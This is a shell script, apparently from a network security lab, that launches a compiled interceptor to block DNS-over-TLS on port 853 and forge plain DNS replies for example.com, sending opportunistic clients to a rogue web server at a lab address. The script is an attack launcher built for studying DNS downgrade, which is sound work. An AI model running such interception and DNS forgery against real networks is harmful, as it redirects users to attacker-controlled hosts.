#!/bin/sh
# Attack (iii): Transport Denial & Downgrade Attack
# Runs the C++ interceptor in --deny mode on the attacker.
# - Intercepts and DROPS TCP 853 packets to deny DoT transport.
# - Intercepts UDP 53 fallback queries for example.com and FORGES the response
#   to point to rogue-web (172.16.1.30).
#
# Client 1 (Strict) -> connection times out on port 853, refuses fallback (Attack fails to forge).
# Client 2 (Opportunistic) -> falls back to UDP 53, accepts forged answer 172.16.1.30 (Attack succeeds).

set -eu

pkill -f '[i]nterceptor' 2>/dev/null || true

ping -c 1 -W 1 172.16.1.10 >/dev/null 2>&1 || true
arping -c 1 -w 1 -I eth0 172.16.1.10 >/dev/null 2>&1 || true
ip link set eth0 mtu 65535 2>/dev/null || true

CLIENT_MAC=$(ip neigh show 172.16.1.10 2>/dev/null | awk '/lladdr/ {print $5}' | head -n 1)
if [ -z "$CLIENT_MAC" ]; then
    CLIENT_MAC=$(awk '/172.16.1.10/ {print $4}' /proc/net/arp 2>/dev/null | head -n 1)
fi

cd /lab/attacker
make

if [ -n "$CLIENT_MAC" ] && [ "$CLIENT_MAC" != "00:00:00:00:00:00" ]; then
    nohup ./interceptor --deny --client-mac "$CLIENT_MAC" > interceptor.log 2>&1 &
else
    nohup ./interceptor --deny > interceptor.log 2>&1 &
fi

sleep 1
cat interceptor.log
echo "Interceptor running in DENY-AND-DOWNGRADE mode (Attack iii)."
